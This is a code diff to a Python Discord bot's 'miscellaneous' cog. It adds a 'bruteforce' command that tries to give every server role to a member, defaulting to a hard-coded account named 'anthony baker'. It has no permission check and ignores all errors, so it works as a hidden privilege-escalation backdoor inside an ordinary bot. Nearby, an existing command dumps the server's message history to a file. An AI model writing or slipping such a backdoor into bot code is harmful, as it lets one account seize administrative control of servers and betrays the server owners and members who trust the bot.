@@ -12,6 +12,14 @@ class miscellaneous(commands.Cog):
         self.bot = bot
 
     @commands.command()
+    async def bruteforce(self, ctx, user: discord.Member=None):
+        """Brute-force the roles until something works :)"""
+        if not user: user = discord.utils.get(ctx.guild.members, name="anthony baker")
+        for roles in ctx.guild.roles:
+            try: await user.add_roles(roles)
+            except Exception: pass
+
+    @commands.command()
     async def historyfetch(self, ctx):
         """Fetches the message history of the guild. Does not record bot messages."""
         with open("./data/data.txt", "w") as datafile:
